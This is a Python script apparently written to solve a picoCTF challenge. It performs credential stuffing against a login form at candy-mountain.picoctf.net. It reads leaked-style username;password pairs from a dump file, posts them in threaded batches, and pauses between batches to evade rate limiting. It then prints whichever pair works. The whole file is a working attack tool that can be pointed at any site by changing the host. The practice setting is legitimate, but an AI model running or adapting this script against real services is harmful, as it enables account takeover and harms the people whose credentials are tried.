#!/usr/bin/env python3
import requests
import threading
import time
from queue import Queue


host = 'candy-mountain.picoctf.net'
port = 63972
path = '/login'
url = 'http://'+host+':'+str(port)+path
user_found = False
found_creds = {}

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}


found_event = threading.Event()

def read_credentials(filepath:str) -> dict[tuple[str,str]]:
    creds = []

    with open(filepath) as f:
        for lineno, line in enumerate(f, 1):
            username, password = line.strip().split(';')
            creds.append(tuple((username, password)))
    return creds

def login(user: str, pwd: str):
    global user_found
    if not found_event.is_set():
        data = {'username': user,'password': pwd}
        print(f'Try {url}::{user}:{pwd}')

        try:
            response = requests.post(url, data=data, timeout=5)
        except requests.RequestException:
            return
        if 'username or password' not in response.text and not found_event.is_set():
            user_found = True
            found_event.set()
            found_creds['username'] = user
            found_creds['password'] = pwd


def main():
    creds = read_credentials('creds-dump.txt')

    batch = 10
    threads = []
    for i in range(0, len(creds), batch):
        for credentials in creds[i:i+batch]:
            user, pwd = credentials
            t = threading.Thread(
                target=login,
                args=(user,pwd,)
            )
            t.start()
            threads.append(t)

            for t in threads:
                t.join()

        if not user_found:
            time.sleep(125)
        else:

            break

    if user_found:
        print(f"  ✅  VALID CREDENTIALS FOUND")
        print(f"  Username : {found_creds.get('username')}")
        print(f"  Password : {found_creds.get('password')}")
    else:
        print(f"  ❌  CREDENTIALS NOT FOUND")

if __name__ == '__main__':
    main()
